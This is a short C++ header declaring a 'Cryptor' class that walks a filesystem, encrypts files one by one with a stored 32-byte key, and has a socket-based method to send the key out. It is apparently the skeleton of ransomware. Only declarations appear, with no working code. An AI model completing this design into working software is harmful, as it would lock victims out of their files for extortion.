#pragma once

#include <filesystem>
#include <vector>
#include <kitty/socket.h>

class Cryptor
{
public:
	unsigned char key[32];
	std::vector<std::filesystem::path> encryptedFiles;

	Cryptor();

	bool RunFilesystem(std::filesystem::path startingPath);
	bool SendKey() const;

private:
	bool EncryptFileK(std::string filePath) const;
};